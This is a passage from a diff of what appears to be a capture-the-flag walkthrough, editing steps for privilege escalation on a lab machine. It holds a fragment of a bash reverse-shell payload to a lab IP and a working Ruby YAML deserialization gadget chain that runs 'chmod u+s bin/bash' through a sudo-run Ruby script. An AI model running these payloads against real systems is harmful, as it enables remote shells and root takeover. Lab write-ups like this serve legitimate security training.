@@ -179,25 +179,40 @@ http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.1
 22. Change the git_set value to `chmod u+s bin/bash`.
 
 ```rb
- ---
- - !ruby/object:Gem::Installer
-     i: x
- - !ruby/object:Gem::SpecFetcher
-     i: y
- - !ruby/object:Gem::Requirement
-   requirements:
-     !ruby/object:Gem::Package::TarReader
-     io: &1 !ruby/object:Net::BufferedIO
-       io: &1 !ruby/object:Gem::Package::TarReader::Entry
-          read: 0
-          header: "abc"
-       debug_output: &1 !ruby/object:Net::WriteAdapter
-          socket: &1 !ruby/object:Gem::RequestSet
-              sets: !ruby/object:Net::WriteAdapter
-                  socket: !ruby/module 'Kernel'
-                  method_id: :system
-              git_set: chmod u+s bin/bash
-          method_id: :resolve 
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod u+s bin/bash
+         method_id: :resolve
 ```
 
-23. Now make a new file named `dependencies.yml` then paste the script inside it. Next. 
+23. Now make a new file named `dependencies.yml` then paste the script inside it. 
+24. Next, to run the script, remember what we got from `sudo -l`.
+
+> sudo -l
+
+![image](https://user-images.githubusercontent.com/70703371/211287339-32dbd1cf-041f-4d4e-8e60-2d8629d355a8.png)
+
+
+25. Hence, the command is -> `sudo /usr/bin/ruby /opt/update_dependencies.rb`
+
+> RESULT
+
+
+
+![image](https://user-images.githubusercontent.com/70703371/211289639-890b827a-2837-4666-a99c-587d385b5f19.png)
+
